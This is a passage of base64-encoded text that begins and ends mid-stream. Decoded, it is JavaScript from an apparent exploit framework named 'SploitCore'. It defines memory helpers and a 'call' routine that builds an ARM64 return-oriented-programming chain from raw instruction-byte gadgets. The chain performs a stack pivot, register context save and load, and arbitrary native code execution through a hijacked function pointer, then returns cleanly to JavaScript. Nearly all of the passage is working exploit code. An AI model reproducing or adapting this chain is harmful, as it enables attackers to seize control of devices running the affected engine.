eDQwLCAweEY5LCAweDgyLCAweDAwLCAweDAwLCAweEI0LCAweEUwLCAweDAzLCAweDAwLCAweDMyXSksIHN0cnVjdDEsIDApO1xuXHR0aGlzLndyaXRlOChzdHJ1Y3QyLCBzdHJ1Y3QxLCAweDEwID4+IDIpO1xuXG5cdHRoaXMud3JpdGU4KHN0cnVjdDMsIHN0cnVjdDIsIDApO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHhmMywgMHgwMywgMHgwMCwgMHhhYSwgMHgwOCwgMHg0MSwgMHgwMCwgMHg5MSwgMHg2OCwgMHgwMiwgMHgwMCwgMHhmOSwgMHg2OCwgMHgwZSwgMHg0MCwgMHhmOSwgMHgwMCwgMHgwMSwgMHgzZiwgMHhkNl0pLCBzdHJ1Y3QyLCAweDIwID4+IDIpO1xuXG5cdHRoaXMud3JpdGU4KFsweDAwMDAwMDAwLCAweGZmZmYwMDAwXSwgc3RydWN0MywgMHg4ID4+IDIpO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHgwOCwgMHg4OCwgMHg0MiwgMHhmOSwgMHgwMiwgMHgxOSwgMHg0MCwgMHhmOSwgMHg0MCwgMHgwMCwgMHgxZiwgMHhkNl0pLCBzdHJ1Y3QzLCAweDE4ID4+IDIpO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHgwOSwgMHgxMSwgMHg0MCwgMHhmOSwgMHhlOCwgMHgyMywgMHgwMCwgMHg5MSwgMHhlMSwgMHgwMywgMHgxNCwgMHhhYSwgMHgyMCwgMHgwMSwgMHgzZiwgMHhkNl0pLCBzdHJ1Y3QzLCAweDIwID4+IDIpO1xuXHR0aGlzLndyaXRlOChzdHJ1Y3Q0LCBzdHJ1Y3QzLCAweDUxMCA+PiAyKTtcblxuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHg3OCwgMHgwNiwgMHg0MCwgMHhmOSwgMHhlMSwgMHgwMywgMHgxZSwgMHgzMiwgMHgwMCwgMHgwMSwgMHgzZiwgMHhkNl0pLCBzdHJ1Y3Q0LCAweDE4ID4+IDIpO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHg2MCwgMHgwMywgMHgzZiwgMHhkNl0pLCBzdHJ1Y3Q0LCAweDI4ID4+IDIpO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHgwMiwgMHgwZCwgMHg0MCwgMHhmOSwgMHgwOCwgMHgxNSwgMHg0MCwgMHhmOSwgMHhlMCwgMHgwMywgMHgwMSwgMHhhYSwgMHhlMSwgMHgwMywgMHgwOCwgMHhhYSwgMHg0MCwgMHgwMCwgMHgxZiwgMHhkNl0pLCBzdHJ1Y3Q0LCAweDMwID4+IDIpO1xuXG5cdHZhciBmdW5jYWRkciA9IHRoaXMuZ2V0RnVuY0FkZHIoKTtcblx0dXRpbHMuZGxvZygnRnVuY3Rpb24gb2JqZWN0IGF0ICcgKyB1dGlscy5wYWRkcihmdW5jYWRkcikpO1xuXG5cdHZhciBjdXJwdHIgPSB0aGlzLnJlYWQ4KGZ1bmNhZGRyLCA4KTtcblx0dGhpcy53cml0ZTgoamFkZHIsIGZ1bmNhZGRyLCA4KTtcblx0Ly8gdXRpbHMubG9nKCdQYXRjaGVkIGZ1bmN0aW9uIGFkZHJlc3MgZnJvbSAnICsgdXRpbHMucGFkZHIoY3VycHRyKSArICcgdG8gJyArIHV0aWxzLnBhZGRyKHRoaXMucmVhZDgodGhpcy5mdW5jYWRkciwgOCkpKTtcblxuXHR1dGlscy5kbG9nKCdBc3NpZ25lZC4gIEp1bXBpbmcgdG8gZ2V0IFNQLicpO1xuXHR0aGlzLmZ1bmMuYXBwbHkoMHgxMDAsIFswLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCBjYXJyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwXSk7XG5cdHV0aWxzLmRsb2coJ0p1bXBlZCBiYWNrIGZyb20gZ2V0dGluZyBTUC4nKTtcblxuXHR0aGlzLndyaXRlOChjdXJwdHIsIGZ1bmNhZGRyLCA4KTtcblx0dXRpbHMuZGxvZygnUmVzdG9yZWQgb3JpZ2luYWwgZnVuY3Rpb24gcG9pbnRlci4nKTtcblxuXHR2YXIgc3AgPSB1dGlscy5hZGQyKHRoaXMucmVhZDgoc3RydWN0MywgMCksIC0weDE4KTtcblx0dXRpbHMuZGxvZygnR290IHN0YWNrIHBvaW50ZXI6ICcgKyB1dGlscy5wYWRkcihzcCkpO1xuXG5cdHRoaXMuZnJlZShzdHJ1Y3QxKTtcblx0dGhpcy5mcmVlKHN0cnVjdDIpO1xuXHR0aGlzLmZyZWUoc3RydWN0Myk7XG5cdHRoaXMuZnJlZShzdHJ1Y3Q0KTtcblxuXHR1dGlscy5kbG9nKCdGcmVlZCBidWZmZXJzJyk7XG5cblx0cmV0dXJuIHNwO1xufTtcblxuLyoqXG5cdEFsbG9jYXRlcyBhIHJlZ2lvbiBvZiBtZW1vcnkgdG8gdXNlXG5cdEBwYXJhbSB7bnVtYmVyfSBieXRlcyAtIFNpemUgb2YgcmVnaW9uXG5cdEByZXR1cm5zIHt1NjR9IEFkZHJlc3Mgb2YgcmVnaW9uXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLm1hbGxvYyA9IGZ1bmN0aW9uIChieXRlcykge1xuXHR2YXIgb2JqID0gbmV3IEFycmF5QnVmZmVyKGJ5dGVzKTtcblx0dmFyIGFkZHIgPSB0aGlzLmdldEFycmF5QnVmZmVyQWRkcihvYmopO1xuXHR0aGlzLmFsbG9jYXRlZFthZGRyXSA9IG9iajtcblx0cmV0dXJuIGFkZHI7XG59O1xuXG4vKipcblx0VE9ETyBET0NTXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmZyZWUgPSBmdW5jdGlvbiAoYWRkcikge1xuXHRkZWxldGUgdGhpcy5hbGxvY2F0ZWRbYWRkcl07XG59O1xuXG4vKipcblx0VE9ETyBET0NTXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmdldEFycmF5QnVmZmVyQWRkciA9IGZ1bmN0aW9uIChhYikge1xuXHR2YXIgb2Zmc2V0ID0gMDtcblx0aWYgKEFycmF5QnVmZmVyLmlzVmlldyhhYikpIHtcblx0XHRvZmZzZXQgPSBhYi5ieXRlT2Zmc2V0O1xuXHRcdGFiID0gYWIuYnVmZmVyO1xuXHR9XG5cdGlmICghKGFiIGluc3RhbmNlb2YgQXJyYXlCdWZmZXIpKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKCdleHBlY3RlZCBBcnJheUJ1ZmZlciBvciB2aWV3Jyk7XG5cdH1cblx0cmV0dXJuIHV0aWxzLmFkZDIodGhpcy5yZWFkOCh0aGlzLnJlYWQ4KHRoaXMuZ2V0QWRkcihhYiksIDQpLCA2KSwgb2Zmc2V0KTtcbn07XG5cbi8qKlxuXHRUT0RPIERPQ1NcbiAqL1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUuY2FsbCA9IGZ1bmN0aW9uIChmdW5jcHRyLCBhcmdzLCBmYXJncywgcmVnaXN0ZXJzLCBkdW1wX3JlZ3MpIHtcblx0aWYgKHR5cGVvZiAoZnVuY3B0cikgPT09ICdudW1iZXInKSB7XG5cdFx0ZnVuY3B0ciA9IHV0aWxzLmFkZDIodGhpcy5tYWluYWRkciwgZnVuY3B0cik7XG5cdH1cblx0c3dpdGNoIChhcmd1bWVudHMubGVuZ3RoKSB7XG5cdGNhc2UgMToge1xuXHRcdGFyZ3MgPSBbXTtcblx0fVxuXHRjYXNlIDI6IHtcblx0XHRmYXJncyA9IFtdO1xuXHR9XG5cdGNhc2UgMzoge1xuXHRcdHJlZ2lzdGVycyA9IFtdO1xuXHR9XG5cdGNhc2UgNDoge1xuXHRcdGR1bXBfcmVncyA9IGZhbHNlO1xuXHR9XG5cdH1cblxuXHRmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3MubGVuZ3RoOyBpKyspIHtcblx0XHRpZiAoYXJnc1tpXSBpbnN0YW5jZW9mIEFycmF5QnVmZmVyIHx8IEFycmF5QnVmZmVyLmlzVmlldyhhcmdzW2ldKSkge1xuXHRcdFx0YXJnc1tpXSA9IHRoaXMuZ2V0QXJyYXlCdWZmZXJBZGRyKGFyZ3NbaV0pO1xuXHRcdH1cblx0XHRpZiAodHlwZW9mKGFyZ3NbaV0pICE9PSBcIm51bWJlclwiICYmICFBcnJheS5pc0FycmF5KGFyZ3NbaV0pKSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJhcmd1bWVudCBcIiArIGkgKyBcIiBpcyBpbnZhbGlkOiBcIiArIGFyZ3NbaV0pO1xuXHRcdH1cblx0fVxuXG5cdHZhciBjYXJyID0gbmV3IFVpbnQzMkFycmF5KDE2KTtcblx0dmFyIGNidWYgPSB0aGlzLnJlYWQ4KHRoaXMuZ2V0QWRkcihjYXJyKSwgNCk7XG5cblx0dXRpbHMuZGxvZygnU3RhcnRpbmcgaG9seSByb3AnKTtcblx0dmFyIGphZGRyID0gdGhpcy5nYWRnZXQoWzB4NzQsIDB4MzIsIDB4NDAsIDB4RjksIDB4N0YsIDB4M0UsIDB4MDAsIDB4RjksIDB4MTQsIDB4MDEsIDB4MDAsIDB4QjQsIDB4ODAsIDB4MEEsIDB4NDAsIDB4RjldKTtcblx0dXRpbHMuZGxvZygnTmV3IGp1bXAgYXQgJyArIHV0aWxzLnBhZGRyKGphZGRyKSk7XG5cblx0dXRpbHMuZGxvZygnU2V0dGluZyB1cCBzdHJ1Y3RzJyk7XG5cblx0Ly8gQmVnaW4gR2FkZ2V0c1xuXHR2YXIgbW92X3gwX2ludG9feDhfbG9hZF9icl94MiA9IHRoaXMuZ2FkZ2V0KFsweEU4LCAweDAzLCAweDAwLCAweEFBLCAweDAyLCAweDA1LCAweDQwLCAweEY5LCAweDgyLCAweDAwLCAweDAwLCAweEI0LCAweEUwLCAweDAzLCAweDAwLCAweDMyXSk7XG5cdHZhciBsb2FkX3gwX3cxX3gyX3g5X2Jscl94OSA9IHRoaXMuZ2FkZ2V0KFsweDA5LCAweDA5LCAweDQwLCAweGY5LCAweDAwLCAweDAxLCAweDQwLCAweGY5LCAweDAxLCAweDI5LCAweDQwLCAweGI5LCAweDAyLCAweDFkLCAweDQwLCAweGY5LCAweDIwLCAweDAxLCAweDNmLCAweGQ2XSk7XG5cdHZhciBsb2FkX3gyX3gzMF9tb3Zfc3BfaW50b194Ml9icl94MzAgPSB0aGlzLmdhZGdldChbMHgxZCwgMHg3OCwgMHg0NSwgMHhhOSwgMHgwMiwgMHgzNCwgMHg0MCwgMHhmOSwgMHg1ZiwgMHgwMCwgMHgwMCwgMHg5MSwgMHgwOCwgMHgyNCwgMHg0NywgMHg2ZCwgMHgwYSwgMHgyYywgMHg0OCwgMHg2ZCwgMHgwYywgMHgzNCwgMHg0OSwgMHg2ZCwgMHgwZSwgMHgzYywgMHg0YSwgMHg2ZCwgMHhlMCwgMHgwMywgMHgwMSwgMHhhYSwgMHg0MSwgMHgwMCwgMHgwMCwgMHhiNSwgMHgyMCwgMHgwMCwgMHg4MCwgMHhkMiwgMHhjMCwgMHgwMywgMHgxZiwgMHhkNl0pO1xuXHR2YXIgbG9hZF94Ml94OF9icl94MiA9IHRoaXMuZ2FkZ2V0KFsweDAyLCAweDBkLCAweDQwLCAweGY5LCAweDA4LCAweDE1LCAweDQwLCAweGY5LCAweGUwLCAweDAzLCAweDAxLCAweGFhLCAweGUxLCAweDAzLCAweDA4LCAweGFhLCAweDQwLCAweDAwLCAweDFmLCAweGQ2XSk7XG5cdHZhciBsb2FkX3gzMF9mcm9tX3NwX2JyX3gyID0gdGhpcy5nYWRnZXQoWzB4ZmQsIDB4N2IsIDB4NDIsIDB4YTksIDB4ZmYsIDB4YzMsIDB4MDAsIDB4OTEsIDB4NDAsIDB4MDAsIDB4MWYsIDB4ZDZdKTtcblx0dmFyIHJldHVybmdhZGcgPSB0aGlzLmdhZGdldChbMHg2MCwgMHgwMywgMHgzZiwgMHhkNl0pO1xuXG5cdHZhciBzYXZlZ2FkZyA9IHRoaXMuZ2FkZ2V0KFsweDAwLCAweDA0LCAweDAwLCAweGE5LCAweDAyLCAweDBjLCAweDAxLCAweGE5LCAweDA0LCAweDE0LCAweDAyLCAweGE5LCAweDA2LCAweDFjLCAweDAzLCAweGE5XSk7XG5cdHZhciBsb2FkZ2FkZyA9IHRoaXMuZ2FkZ2V0KFsweDAyLCAweDBjLCAweDQxLCAweGE5LCAweDA0LCAweDE0LCAweDQyLCAweGE5LCAweDA2LCAweDFjLCAweDQzLCAweGE5LCAweDA4LCAweDI0LCAweDQ0LCAweGE5XSk7XG5cdHZhciBsb2FkZ2FkZ19zdGFnZTIgPSB0aGlzLmdhZGdldChbMHhlMCwgMHgwNywgMHhjMSwgMHhhOCwgMHhlMiwgMHgwZiwgMHhjMSwgMHhhOCwgMHhlNCwgMHgxNywgMHhjMSwgMHhhOCwgMHhlNiwgMHgxZiwgMHhjMSwgMHhhOF0pO1xuXG5cdHZhciBsb2FkX3gxOSA9IHRoaXMuZ2FkZ2V0KFsweGYzLCAweDE3LCAweDQwLCAweGY5LCAweGZkLCAweDdiLCAweDQzLCAweGE5LCAweGZmLCAweDAzLCAweDAxLCAweDkxLCAweGMwLCAweDAzLCAweDVmLCAweGQ2XSk7XG5cdHZhciBzdHJfeDIwID0gdGhpcy5nYWRnZXQoWzB4NzQsIDB4MGEsIDB4MDAsIDB4ZjksIDB4ZmQsIDB4N2IsIDB4NDEsIDB4YTksIDB4ZjQsIDB4NGYsIDB4YzIsIDB4YTgsIDB4YzAsIDB4MDMsIDB4NWYsIDB4ZDZdKTtcblx0dmFyIHN0cl94OCA9IHRoaXMuZ2FkZ2V0KFsweGZkLCAweDdiLCAweDQxLCAweGE5LCAweDY4LCAweDAyLCAweDAwLCAweGY5LCAweGYzLCAweDA3LCAweDQyLCAweGY4LCAweGMwLCAweDAzLCAweDVmLCAweGQ2XSk7XG5cdHZhciBsb2FkX2FuZF9zdHJfeDggPSB0aGlzLmdhZGdldChbMHg2OCwgMHgwMiwgMHg0MCwgMHhmOSwgMHg4OCwgMHgwMiwgMHgwMCwgMHhmOSwgMHhmZCwgMHg3YiwgMHg0MSwgMHhhOSwgMHhmNCwgMHg0ZiwgMHhjMiwgMHhhOF0pO1xuXHR2YXIgc3RyX3gxID0gdGhpcy5nYWRnZXQoWzB4NjEsIDB4MGUsIDB4MDAsIDB4ZjksIDB4ZmQsIDB4N2IsIDB4NDEsIDB4YTksIDB4ZjQsIDB4NGYsIDB4YzIsIDB4YTgsIDB4YzAsIDB4MDMsIDB4NWYsIDB4ZDZdKTtcblx0dmFyIG1vdl94Ml9pbnRvX3gxID0gdGhpcy5nYWRnZXQoWzB4ZTEsIDB4MDMsIDB4MDIsIDB4YWEsIDB4MDAsIDB4MDEsIDB4M2YsIDB4ZDYsIDB4ZmQsIDB4N2IsIDB4YzEsIDB4YTgsIDB4ZTAsIDB4MDMsIDB4MWYsIDB4MmFdKTtcblx0dmFyIHN0cl94MCA9IHRoaXMuZ2FkZ2V0KFsweGZkLCAweDdiLCAweDQxLCAweGE5LCAweDYwLCAweDAyLCAweDAwLCAweGY5LCAweGYzLCAweDA3LCAweDQyLCAweGY4LCAweGMwLCAweDAzLCAweDVmLCAweGQ2XSk7XG5cdHZhciBzdHJfeDkgPSB0aGlzLmdhZGdldChbMHg2OSwgMHgyZSwgMHgwMCwgMHhmOSwgMHhmZCwgMHg3YiwgMHg0MSwgMHhhOSwgMHhmMywgMHgwNywgMHg0MiwgMHhmOCwgMHhjMCwgMHgwMywgMHg1ZiwgMHhkNl0pO1xuXHR2YXIgbW92X3gxOV9pbnRvX3gwID0gdGhpcy5nYWRnZXQoWzB4ZmQsIDB4N2IsIDB4NDEsIDB4YTksIDB4ZTAsIDB4MDMsIDB4MTMsIDB4YWEsIDB4ZjMsIDB4MDcsIDB4NDIsIDB4ZjgsIDB4YzAsIDB4MDMsIDB4NWYsIDB4ZDZdKTtcblxuXHQvLyBFbmQgR2FkZ2V0c1xuXG5cdHZhciBjb250ZXh0X2xvYWRfc3RydWN0ID0gdGhpcy5tYWxsb2MoMHgyMDApO1xuXHR2YXIgYmxvY2tfc3RydWN0XzAgPSB0aGlzLm1hbGxvYygweDIwMCk7XG5cdHZhciBibG9ja19zdHJ1Y3RfMSA9IHRoaXMubWFsbG9jKDB4MjAwKTtcblx0dmFyIGJsb2NrX3N0cnVjdF8yID0gdGhpcy5tYWxsb2MoMHgyMDApO1xuXHR2YXIgYmxvY2tfc3RydWN0XzMgPSB0aGlzLm1hbGxvYygweDIwMCk7XG5cdHZhciBzYXZlYXJlYSA9IHRoaXMubWFsbG9jKDB4NDAwKTtcblx0dmFyIGxvYWRhcmVhID0gdGhpcy5tYWxsb2MoMHg0MDApO1xuXHR2YXIgZHVtcGFyZWEgPSB0aGlzLm1hbGxvYygweDQwMCk7XG5cdHZhciBhbGxvY2F0ZWRfc3RhY2sgPSB1dGlscy5hZGQyKHRoaXMuZmFrZV9zdGFjaywgMCk7IC8vIE1ha2UgYSBjb3B5LlxuXHR2YXIgYmFzZV9zcCA9IHRoaXMuZ2V0U1AoKTtcblxuXHQvLyBTdGVwIDA6IExvYWQgdXAgc29tZSBpbml0aWFsIFJPUCB0byBsYXVuY2ggaW50byBmdWxsIGNvbnRyb2xcblxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGNidWYsIDB4MzgpLCBjYnVmLCAwKTsgLy8gY2J1ZlswXSA9IGNidWYgKyAweDhcblx0dGhpcy53cml0ZTgobG9hZF94Ml94OF9icl94MiwgY2J1ZiwgMHg4ID4+IDIpOyAvLyBUaGlyZCBnYWRnZXRcblx0dGhpcy53cml0ZTgobG9hZF94MF93MV94Ml94OV9ibHJfeDksIGNidWYsIDB4MTggPj4gMik7IC8vIEZvdXJ0aCBHYWRnZXRcblx0dGhpcy53cml0ZTgoYmxvY2tfc3RydWN0XzAsIGNidWYsIDB4MjggPj4gMik7IC8vIFNldHVwIFg4IHdpdGggc3RydWN0XG5cdHRoaXMud3JpdGU4KG1vdl94MF9pbnRvX3g4X2xvYWRfYnJfeDIsIGNidWYsIDB4MzggPj4gMik7IC8vIFNlY29uZCBnYWRnZXRcblxuXHQvLyBTdGVwIDE6IExvYWQgWDggd2l0aCBhIGZpeGVkIGFkZHJlc3MsIGNvbnRyb2wgWDA6WDJcblxuXHR0aGlzLndyaXRlOChjb250ZXh0X2xvYWRfc3RydWN0LCBibG9ja19zdHJ1Y3RfMCwgMHgwMCA+PiAyKTtcblx0dGhpcy53cml0ZTgobG9hZF94MF93MV94Ml94OV9ibHJfeDksIGJsb2NrX3N0cnVjdF8wLCAweDA4ID4+IDIpO1xuXHR0aGlzLndyaXRlOChsb2FkX3gyX3gzMF9tb3Zfc3BfaW50b194Ml9icl94MzAsIGJsb2NrX3N0cnVjdF8wLCAweDEwID4+IDIpO1xuXHR0aGlzLndyaXRlOChsb2FkX3gwX3cxX3gyX3g5X2Jscl94OSwgYmxvY2tfc3RydWN0XzAsIDB4MTggPj4gMik7XG5cdHRoaXMud3JpdGU4KGJsb2NrX3N0cnVjdF8xLCBibG9ja19zdHJ1Y3RfMCwgMHgyOCA+PiAyKTtcblxuXHQvLyBTdGVwIDI6IFN0YWNrIHBpdm90IHRvIFNQIC0gMHg4MDAwLiAtMHgzMCB0byB1c2UgYSBMUi1sb2FkaW5nIGdhZGdldC5cblxuXHR0aGlzLndyaXRlOChsb2FkX3gyX3g4X2JyX3gyLCBjb250ZXh0X2xvYWRfc3RydWN0LCAweDU4ID4+IDIpO1xuXHR0aGlzLndyaXRlOChhbGxvY2F0ZWRfc3RhY2ssIGNvbnRleHRfbG9hZF9zdHJ1Y3QsIDB4NjggPj4gMik7XG5cdHRoaXMud3JpdGU4KHJldHVybmdhZGcsIGNvbnRleHRfbG9hZF9zdHJ1Y3QsIDB4MTU4ID4+IDIpO1xuXHR0aGlzLndyaXRlOChiYXNlX3NwLCBjb250ZXh0X2xvYWRfc3RydWN0LCAweDE2OCA+PiAyKTtcblxuXHQvLyBTdGVwIDM6IFBlcmZvcm0gYSBmdWxsIGNvbnRleHQtc2F2ZSBvZiBhbGwgcmVnaXN0ZXJzIHRvIHNhdmVhcmVhLlxuXG5cdHRoaXMud3JpdGU4KHNhdmVhcmVhLCBibG9ja19zdHJ1Y3RfMSwgMHgwID4+IDIpO1xuXHR0aGlzLndyaXRlOChsb2FkX3gzMF9mcm9tX3NwX2JyX3gyLCBibG9ja19zdHJ1Y3RfMSwgMHgxMCA+PiAyKTtcblx0dGhpcy53cml0ZTgobG9hZF94MF93MV94Ml94OV9ibHJfeDksIGJsb2NrX3N0cnVjdF8xLCAweDE4ID4+IDIpO1xuXHR0aGlzLndyaXRlOChibG9ja19zdHJ1Y3RfMiwgYmxvY2tfc3RydWN0XzEsIDB4MjggPj4gMik7XG5cdHRoaXMud3JpdGU4KHNhdmVnYWRnLCBibG9ja19zdHJ1Y3RfMSwgMHgzOCA+PiAyKTtcblxuXHR0aGlzLndyaXRlOChsb2FkX3gyX3g4X2JyX3gyLCBhbGxvY2F0ZWRfc3RhY2ssIDB4MjggPj4gMik7XG5cblx0dmFyIHNwID0gdXRpbHMuYWRkMihhbGxvY2F0ZWRfc3RhY2ssIDB4MzApO1xuXG5cdC8vIFN0ZXAgNDogUGVyZm9ybSBhIGZ1bGwgY29udGV4dC1sb2FkIGZyb20gYSByZWdpb24gd2UgY29udHJvbC5cblxuXHR0aGlzLndyaXRlOChsb2FkYXJlYSwgYmxvY2tfc3RydWN0XzIsIDB4MDAgPj4gMik7XG5cdHRoaXMud3JpdGU4KGxvYWRnYWRnLCBibG9ja19zdHJ1Y3RfMiwgMHgxMCA+PiAyKTtcblxuXHQvLyBTdGVwIDU6IFdyaXRlIGRlc2lyZWQgcmVnaXN0ZXIgY29udGVudHMgdG8gdGhlIGNvbnRleHQgbG9hZCByZWdpb24uXG5cblx0dGhpcy53cml0ZTgoc3AsIGxvYWRhcmVhLCAweEY4ID4+IDIpOyAvLyBDYW4gd3JpdGUgYW4gYXJiaXRyYXJ5IHN0YWNrIHB0ciBoZXJlLCBmb3IgYXJndW1lbnQgcGFzc2luZ1xuXHR0aGlzLndyaXRlOChsb2FkZ2FkZ19zdGFnZTIsIGxvYWRhcmVhLCAweDEwMCA+PiAyKTsgLy8gUmV0dXJuIGZyb20gbG9hZCB0byBsb2FkLXN0YWdlMlxuXG5cdC8vIFdyaXRlIHJlZ2lzdGVycyBmb3IgbmF0aXZlIGNvZGUuXG5cdGlmIChyZWdpc3RlcnMubGVuZ3RoID4gOSkge1xuXHRcdGZvciAoaSA9IDk7IGkgPCAzMCAmJiBpIDwgcmVnaXN0ZXJzLmxlbmd0aDsgaSsrKSB7XG5cdFx0XHR0aGlzLndyaXRlOChyZWdpc3RlcnNbaV0sIGxvYWRhcmVhLCAoOCAqIGkpID4+IDIpO1xuXHRcdH1cblx0fVxuXG5cdGlmIChyZWdpc3RlcnMubGVuZ3RoID4gMCkge1xuXHRcdGZvciAoaSA9IDA7IGkgPD0gOCAmJiBpIDwgcmVnaXN0ZXJzLmxlbmd0aDsgaSsrKSB7XG5cdFx0XHR0aGlzLndyaXRlOChyZWdpc3RlcnNbaV0sIHNwLCAoMHg4ICogaSkgPj4gMik7XG5cdFx0fVxuXG5cdFx0aWYgKHJlZ2lzdGVycy5sZW5ndGggPiAxOSkge1xuXHRcdFx0dGhpcy53cml0ZTgocmVnaXN0ZXJzWzE5XSwgc3AsIDB4NDggPj4gMik7XG5cdFx0fVxuXG5cdFx0aWYgKHJlZ2lzdGVycy5sZW5ndGggPiAyOSkge1xuXHRcdFx0dGhpcy53cml0ZTgocmVnaXN0ZXJzWzI5XSwgc3AsIDB4NTAgPj4gMik7XG5cdFx0fVxuXHR9XG5cblx0aWYgKGFyZ3MubGVuZ3RoID4gMCkge1xuXHRcdGZvciAoaSA9IDA7IGkgPCBhcmdzLmxlbmd0aCAmJiBpIDwgODsgaSsrKSB7XG5cdFx0XHR0aGlzLndyaXRlOChhcmdzW2ldLCBzcCwgKDB4OCAqIGkpID4+IDIpO1xuXHRcdH1cblx0fVxuXG5cdGlmIChmYXJncy5sZW5ndGggPiAwKSB7XG5cdFx0Zm9yIChpID0gMDsgaSA8IGZhcmdzLmxlbmd0aCAmJiBpIDwgMzI7IGkrKykge1xuXHRcdFx0dGhpcy53cml0ZTgoZmFyZ3NbaV0sIGxvYWRhcmVhLCAoMHgxMTAgKyA4ICogaSkgPj4gMik7XG5cdFx0fVxuXHR9XG5cblx0dGhpcy53cml0ZTgoZnVuY3B0ciwgbG9hZGFyZWEsIDB4ODAgPj4gMik7IC8vIFNldCB0aGUgY29kZSB0byBjYWxsIHRvIG91ciBmdW5jdGlvbiBwb2ludGVyLlxuXHR0aGlzLndyaXRlOChsb2FkX3gxOSwgc3AsIDB4NTggPj4gMik7IC8vIFNldCBMaW5rIFJlZ2lzdGVyIGZvciBvdXIgYXJiaXRyYXJ5IGZ1bmN0aW9uIHRvIHBvaW50IHRvIGNsZWFudXAgcm9wXG5cblx0Ly8gU3RhY2sgYXJndW1lbnRzIHdvdWxkIGJlIGJvdHRvbWVkLW91dCBhdCBzcCArIDB4RTAuLi5cblx0Ly8gVE9ETzogU3RhY2sgYXJndW1lbnRzIHN1cHBvcnQuIFdvdWxkIGp1c3QgbmVlZCB0byBmaWd1cmUgb3V0IGhvdyBtdWNoIHNwYWNlIHRoZXkgdGFrZSB1cFxuXHQvLyBhbmQgd3JpdGUgUk9QIGFib3ZlIHRoZW0uIE5vdGU6IHRoZSB1c2VyIHdvdWxkIGhhdmUgdG8gY2FsbCBjb2RlIHRoYXQgYWN0dWFsbHkgdXNlZFxuXHQvLyB0aGF0IG1hbnkgc3RhY2sgYXJndW1lbnRzLCBvciBzaGl0J2QgY3Jhc2guXG5cblx0Ly8gUk9QIGN1cnJlbnRseSBiZWdpbnMgYXQgc3AgKyAweEUwXG5cblx0Ly8gU3RlcCA2OiBbQXJiaXRyYXJ5IGNvZGUgZXhlY3V0ZXMgaGVyZV1cblxuXHQvLyBTdGVwIDc6IFBvc3QtY29kZSBleGVjdXRpb24gY2xlYW51cC4gRHVtcCBhbGwgcmVnaXN0ZXJzIHRvIGFub3RoZXIgc2F2ZSBhcmVhLFxuXHQvLyAgICAgICAgIHJldHVybiBjbGVhbmx5IHRvIGphdmFzY3JpcHQuXG5cblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzMDAgLSAweDEwKSwgc3AsICgweDA2MCArIDB4MjgpID4+IDIpOyAvLyBMb2FkIFgxOSA9IGR1bXBhcmVhICsgMHgzMDAgLSAweDEwXG5cdHRoaXMud3JpdGU4KHN0cl94MjAsIHNwLCAoMHgwNjAgKyAweDM4KSA+PiAyKTsgICAgICAgICAgICAgICAgICAgICAgLy8gTG9hZCBMUiB3aXRoIHN0cl94MjBcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzMDgpLCBzcCwgKDB4MEEwICsgMHg4KSA+PiAyKTsgICAgICAgIC8vIExvYWQgWDE5ID0gZHVtcGFyZWEgKyAweDMwOFxuXHR0aGlzLndyaXRlOChzdHJfeDgsIHNwLCAoMHgwQTAgKyAweDE4KSA+PiAyKTsgICAgICAgICAgICAgICAgICAgICAgLy8gTG9hZCBMUiB3aXRoIHN0cl94OFxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGR1bXBhcmVhLCAweDMxMCAtIDB4MTgpLCBzcCwgKDB4MEMwICsgMHgwKSA+PiAyKTsgLy8gTG9hZCBYMTkgPSBkdW1wYXJlYSArIDB4MzEwIC0gMHgxOFxuXHR0aGlzLndyaXRlOChzdHJfeDEsIHNwLCAoMHgwQzAgKyAweDE4KSA+PiAyKTsgICAgICAgICAgICAgICAgICAgICAgLy8gTG9hZCBMUiB3aXRoIHN0cl94MVxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGR1bXBhcmVhLCAweDNGOCksIHNwLCAoMHgwRTAgKyAweDApID4+IDIpOyAgICAgICAgLy8gTG9hZCBYMjAgd2l0aCBzY3JhdGNoIHNwYWNlXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoZHVtcGFyZWEsIDB4MzgwKSwgc3AsICgweDBFMCArIDB4OCkgPj4gMik7ICAgICAgICAvLyBMb2FkIFgxOSA9IGR1bXBhcmVhICsgMHgzODBcblx0dGhpcy53cml0ZTgoc3RyX3gxLCBkdW1wYXJlYSwgMHgzODAgPj4gMik7ICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFdyaXRlIHN0cl94MSB0byBkdW1wYXJlYSArIDB4MzgwXG5cdHRoaXMud3JpdGU4KGxvYWRfYW5kX3N0cl94OCwgc3AsICgweDBFMCArIDB4MTgpID4+IDIpOyAgICAgICAgICAgICAvLyBMb2FkIExSIHdpdGggTG9hZCwgU1RSIFg4XG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoZHVtcGFyZWEsIDB4MzE4IC0gMHgxOCksIHNwLCAoMHgxMDAgKyAweDgpID4+IDIpOyAvLyBMb2FkIFgxOSA9IGR1bXBhcmVhICsgMHgzMTggLSAweDE4XG5cdHRoaXMud3JpdGU4KG1vdl94Ml9pbnRvX3gxLCBzcCwgKDB4MTAwICsgMHgxOCkgPj4gMik7ICAgICAgICAgICAgICAvLyBMb2FkIExSIHdpdGggbW92IHgxLCB4MlxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGR1bXBhcmVhLCAweDNGOCksIHNwLCAo